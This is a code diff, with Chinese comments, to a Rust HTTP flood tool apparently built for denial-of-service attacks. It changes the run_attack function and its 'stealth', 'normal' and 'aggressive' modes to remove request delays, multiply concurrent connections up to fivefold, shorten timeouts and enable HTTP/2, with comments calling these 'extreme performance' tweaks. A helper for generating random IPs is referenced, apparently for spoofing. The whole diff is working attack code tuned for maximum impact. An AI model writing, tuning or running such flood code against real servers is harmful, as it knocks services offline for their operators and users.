@@ -39,14 +39,15 @@ pub async fn run_attack(config: AttackConfig) {
     
     let stats = StatsArc::default();
     
-    // 优化HTTP客户端配置
+    // 优化HTTP客户端配置 - 极限性能优化
     let client = Client::builder()
-        .pool_max_idle_per_host(adjusted_connections) // 增加连接池大小
-        .pool_idle_timeout(Duration::from_secs(60))   // 增加空闲超时
-        .timeout(Duration::from_secs(30))
-        .tcp_keepalive(Some(Duration::from_secs(30)))
-        .tcp_nodelay(true)                           // 禁用Nagle算法
-        // .use_rustls_tls()                            // 使用rustls提高性能
+        .pool_max_idle_per_host(adjusted_connections * 4) // 极限增加连接池大小
+        .pool_idle_timeout(Duration::from_secs(300))      // 大幅增加空闲超时
+        .timeout(Duration::from_secs(5))                  // 极限减少超时时间
+        .tcp_keepalive(Some(Duration::from_secs(120)))    // 大幅增加keepalive时间
+        .tcp_nodelay(true)                                // 禁用Nagle算法
+        .http2_prior_knowledge()                          // 启用HTTP/2
+        // .use_rustls_tls()                                 // 使用rustls提高性能
         .build()
         .expect("无法创建HTTP客户端");
 
@@ -176,9 +177,9 @@ pub async fn run_attack(config: AttackConfig) {
                     }
                 }
                 
-                // 根据模式调整延迟
+                // 根据模式调整延迟 - 极限性能优化
                 let elapsed = request_start.elapsed();
-                if elapsed < Duration::from_millis(10) {
+                if elapsed < Duration::from_millis(1) { // 极限减少最小延迟
                     let random_delay = rand::thread_rng().gen_range(min_delay..max_delay);
                     sleep(Duration::from_millis(random_delay)).await;
                 }
@@ -327,23 +328,23 @@ fn generate_random_ip() -> String {
     )
 }
 
-// 根据攻击模式调整延迟
+// 根据攻击模式调整延迟 - 极限性能优化
 fn get_delay_by_mode(mode: &str) -> (u64, u64) {
     match mode.to_lowercase().as_str() {
-        "stealth" => (100, 500),    // 隐蔽模式：100-500ms
-        "normal" => (50, 150),       // 正常模式：50-150ms
-        "aggressive" => (10, 50),    // 激进模式：10-50ms
-        _ => (50, 150),
+        "stealth" => (5, 20),         // 隐蔽模式：5-20ms (极限减少延迟)
+        "normal" => (0, 5),            // 正常模式：0-5ms (极限减少延迟)
+        "aggressive" => (0, 0),        // 激进模式：0-0ms (无延迟)
+        _ => (0, 5),
     }
 }
 
-// 根据攻击模式调整并发数
+// 根据攻击模式调整并发数 - 极限性能优化
 fn adjust_connections_by_mode(base_connections: usize, mode: &str) -> usize {
     match mode.to_lowercase().as_str() {
-        "stealth" => (base_connections as f64 * 0.5) as usize,  // 减少50%
-        "normal" => base_connections,
-        "aggressive" => (base_connections as f64 * 2.0) as usize, // 增加100%
-        _ => base_connections,
+        "stealth" => (base_connections as f64 * 1.0) as usize,   // 保持100% (提高隐蔽性)
+        "normal" => (base_connections as f64 * 3.0) as usize,    // 增加200% (极限提高效果)
+        "aggressive" => (base_connections as f64 * 5.0) as usize, // 增加400% (极限提高)
+        _ => (base_connections as f64 * 3.0) as usize,
     }
 }
 
